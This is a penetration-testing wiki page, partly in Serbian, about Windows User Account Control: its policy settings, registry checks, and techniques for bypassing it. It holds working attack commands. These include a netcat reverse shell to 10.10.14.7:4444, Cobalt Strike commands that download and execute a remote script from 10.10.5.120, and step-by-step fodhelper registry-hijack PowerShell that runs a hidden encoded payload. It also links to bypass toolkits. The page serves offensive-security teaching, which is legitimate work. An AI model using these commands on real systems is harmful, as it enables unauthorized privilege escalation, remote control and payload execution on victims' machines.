# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) је funkcija која омогућава prikaz zahteva za saglasnost при покретању активности које захтевају povišene privilegije. Апликације имају различite `integrity` нивое, и програм са високим нивоом може изводити задатке који би могли потенцијално компромитовати систем. Када је UAC омогућен, апликације и задаци увек раде у безбедносном контексту налога без администраторских права осим ако администратор изричито не дозволи тим апликацијама/задатцима приступ на нивоу администратора. Ово је уређај за удобност који штити администраторе од ненамерних промена али се не сматра безбедносном границом.

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Када је UAC активан, администраторском налогу се додељују 2 токена: један за стандардног корисника за извођење уобичајених радњи на регуларном нивоу, и један са администраторским привилегијама.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) детаљно објашњава како UAC функционише и обухвата процес пријављивања, корисничко искуство и UAC архитектуру. Администратори могу користити безбедносне политике за конфигурисање начина рада UAC-а специфично за њихову организацију на локалном нивоу (користећи secpol.msc), или их конфигурисати и раширити користећи Group Policy Objects (GPO) у Active Directory домен окружењу. Различита подешавања су детаљно објашњена [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Постоји 10 Group Policy подешавања која се могу поставити за UAC. Следећа табела пружа додатне детаље:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

### UAC Bypass Theory

Neki programi su **autoelevated automatically** ако **корисник припада** **administrator групи**. Ови бинари у свом _**Manifest**_ имају опцију _**autoElevate**_ са вредношћу _**True**_. Бинар такође мора бити **потписан од стране Microsoft-a**.

Многи auto-elevate процеси излажу функционалност преко COM објеката или RPC сервера, које могу да позову процеси који раде са medium integrity (нивоом редовног корисника). Имајте у виду да су COM (Component Object Model) и RPC (Remote Procedure Call) методе које Windows програми користе за комуникацију и извршавање функција између различитих процеса. На пример, **`IFileOperation COM object`** је дизајниран за руковање операцијама над фајловима (копирање, брисање, померање) и може аутоматски да подигне привилегије без приказивања упита.

Понекад се извршавају провере, као проверa да ли је процес покренут из **System32 directory**, што се може заобићи, на пример, **injecting into explorer.exe** или у други извршни фајл лоциран у System32.

Други начин да се заобиђу ове провере је модификација PEB-а. Свaki процес у Windows-у има Process Environment Block (PEB), који садржи важне податке о процесу, као што је путања до извршног фајла. Модификацијом PEB-а, нападачи могу фалсификовати (spoofovati) локацију свог злонамерног процеса, чинећи да изгледа да се покреће из поузданог директоријума (као што је system32). Ове лажне информације збуњују COM објекат и доводе до аутоматског подизања привилегија без упита корисника.

Да би се **bypass-овао** **UAC** (повећање са **medium** integrity нивоa **на high**), неки нападачи користе ове бинаре да **изврше произвољни код**, јер ће бити извршени из процеса са High level integrity.

Možete **proveriti** _**Manifest**_ бинарног фајла користећи алат _**sigcheck.exe**_ из Sysinternals. (`sigcheck.exe -m <file>`) И можете видети `integrity` ниво процеса користећи _Process Explorer_ или _Process Monitor_ (из Sysinternals).

### Check UAC

Да потврдите да ли је UAC омогућен урадите:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Ako je **`1`** onda je UAC **omogućen**, ako je **`0`** ili ne postoji, onda je UAC **onemogućen**.

Zatim proverite **koji nivo** je konfigurisan:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Ako je **`0`**, UAC neće tražiti potvrdu (kao da je **onemogućeno**)
- Ako je **`1`**, administratoru se traži **korisničko ime i lozinka** da izvrši binarni fajl sa visokim privilegijama (na Secure Desktop)
- Ako je **`2`** (**Uvek me obaveštavaj**) UAC će uvek tražiti potvrdu od administratora kada pokuša da izvrši nešto sa visokim privilegijama (na Secure Desktop)
- Ako je **`3`**, slično kao `1` ali nije neophodno na Secure Desktop
- Ako je **`4`**, slično kao `2` ali nije neophodno na Secure Desktop
- Ako je **`5`** (**default**), tražiće od administratora potvrdu da pokrene ne-Windows binarne fajlove sa visokim privilegijama

Zatim, treba da pogledate vrednost **`LocalAccountTokenFilterPolicy`**\
Ako je vrednost **`0`**, onda samo korisnik **RID 500** (**built-in Administrator**) može da izvršava **admin zadatke bez UAC**, a ako je **`1`**, **svi nalozi u grupi "Administrators"** mogu to da rade.

I na kraju, pogledajte vrednost ključa **`FilterAdministratorToken`**\
Ako je **`0`** (podrazumevano), **built-in Administrator** nalog može da obavlja daljinske administratorske zadatke, a ako je **`1`**, built-in Administrator **ne može** da obavlja daljinske administratorske zadatke, osim ako `LocalAccountTokenFilterPolicy` nije postavljen na `1`.

#### Rezime

- Ako `EnableLUA=0` ili **ne postoji**, **nema UAC za nikoga**
- Ako `EnableLua=1` i **`LocalAccountTokenFilterPolicy=1`**, nema UAC za nikoga
- Ako `EnableLua=1` i **`LocalAccountTokenFilterPolicy=0` i `FilterAdministratorToken=0`**, nema UAC za RID 500 (Built-in Administrator)
- Ako `EnableLua=1` i **`LocalAccountTokenFilterPolicy=0` i `FilterAdministratorToken=1`**, UAC za sve

Sve ove informacije se mogu prikupiti korišćenjem **metasploit** modula: `post/windows/gather/win_privs`

Takođe možete proveriti grupe vašeg korisnika i dobiti nivo integriteta:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Imajte na umu da ako imate grafički pristup žrtvi, UAC bypass je jednostavan jer možete jednostavno kliknuti na "Yes" kada se pojavi UAC prompt

UAC bypass je potreban u sledećoj situaciji: **UAC je aktiviran, vaš proces radi u medium integrity context, i vaš korisnik pripada Administrators group**.

Važno je napomenuti da je **mnogo teže zaobići UAC ako je na najvišem nivou bezbednosti (Always) nego ako je na nekom od drugih nivoa (Default).**

### UAC onemogućen

Ako je UAC već onemogućen (`ConsentPromptBehaviorAdmin` je **`0`**) možete izvršiti reverse shell sa administratorskim privilegijama (high integrity level) koristeći nešto poput:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Veoma** osnovni UAC "bypass" (puni pristup fajl sistemu)

Ako imate shell sa korisnikom koji je član Administrators group, možete **mount the C$** deljeni resurs preko SMB (file system) lokalno kao novo diskovno slovo i imaćete **pristup svemu unutar fajl sistema** (čak i Administrator home folder).

> [!WARNING]
> **Izgleda da ovaj trik više ne radi**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass sa cobalt strike

Tehnike cobalt strike će raditi samo ako UAC nije podešen na maksimalni nivo bezbednosti.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** and **Metasploit** takođe imaju nekoliko modula za **bypass** **UAC**.

### KRBUACBypass

Dokumentacija i alat na [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) koji je **kompilacija** nekoliko UAC bypass exploits. Imajte na umu da ćete morati **kompajlirati UACME koristeći visual studio ili msbuild**. Kompilacija će napraviti nekoliko izvršnih fajlova (npr. `Source\Akagi\outout\x64\Debug\Akagi.exe`), moraćete da znate **koji vam treba.**\
Treba da budete **oprezni** jer će neki bypasses **pokrenuti neke druge programe** koji će **obavestiti** **korisnika** da se nešto dešava.

UACME ima **build verziju od koje je svaka tehnika počela da radi**. Možete pretražiti tehniku koja utiče na vaše verzije:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Takođe, koristeći [this](https://en.wikipedia.org/wiki/Windows_10_version_history) stranicu dobijate Windows izdanje `1607` iz build verzija.

### UAC Bypass – fodhelper.exe (Registry hijack)

Pouzdani binarni fajl `fodhelper.exe` se automatski dobija povišene privilegije na modernim Windows sistemima. Kada se pokrene, proverava per-user registry put naveden ispod bez validacije `DelegateExecute` verbe. Postavljanje komande tamo omogućava procesu sa Medium Integrity (korisnik je u Administrators) da pokrene proces sa High Integrity bez UAC prompta.

Registry put koji fodhelper proverava:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell koraci (postavite svoj payload, zatim ga pokrenite):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Napomene:
- Radi kada je trenutni korisnik član Administrators i nivo UAC je podrazumevan/olabavljen (nije Always Notify sa dodatnim ograničenjima).
- Koristite putanju `sysnative` da pokrenete 64-bitni PowerShell iz 32-bitnog procesa na 64-bitnom Windowsu.
- Payload može biti bilo koja komanda (PowerShell, cmd, ili putanja do EXE). Izbegavajte UI prozore koji zahtevaju unos radi prikrivanja.

#### Više UAC bypass

**Sve** tehnike korišćene ovde za bypass AUC **zahtevaju** a **full interactive shell** sa žrtvom (običan nc.exe shell nije dovoljan).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ treba da radi)

### UAC Bypass sa GUI

Ako imate pristup **GUI možete jednostavno prihvatiti UAC prompt** kada se pojavi, zapravo vam ne treba bypass. Dakle, dobijanje pristupa GUI će vam omogućiti bypass UAC.

Pored toga, ako dobijete GUI sesiju koju je neko koristio (potencijalno preko RDP) postoje **neki alati koji će se pokretati kao administrator** iz kojih biste mogli, na primer, **pokrenuti** **cmd** **as admin** direktno bez ponovnog UAC prompta, kao [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Ovo može biti malo više **stealthy**.

### Noisy brute-force UAC bypass

Ako vam nije stalo do buke, uvek možete **pokrenuti nešto poput** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) što će **tražiti podizanje privilegija dok korisnik ne prihvati**.

### Vaš vlastiti bypass - Basic UAC bypass methodology

If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Pronađite binarni fajl koji će **autoelevate** (proverite da li se pri izvršenju pokreće na visokom integritetu).
2. Pomoću procmon pronađite "**NAME NOT FOUND**" događaje koji mogu biti ranjivi na **DLL Hijacking**.
3. Verovatno ćete morati da **write** DLL unutar nekih **protected paths** (kao C:\Windows\System32) gde nemate dozvolu za pisanje. Ovo možete zaobići koristeći:
1. **wusa.exe**: Windows 7,8 and 8.1. Omogućava da se izdvoji sadržaj CAB fajla unutar protected paths (jer se ovaj alat izvršava iz high integrity level).
2. **IFileOperation**: Windows 10.
4. Pripremite **script** da kopirate vaš DLL u zaštićenu putanju i izvršite ranjiv i autoelevated binarni fajl.

### Another UAC bypass technique

Sastoji se u praćenju da li neki **autoElevated binary** pokušava da **read** iz **registry** ime/putanju nekog **binary** ili **command** koji će biti **executed** (ovo je interesantnije ako binary traži ovu informaciju unutar **HKCU**).

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
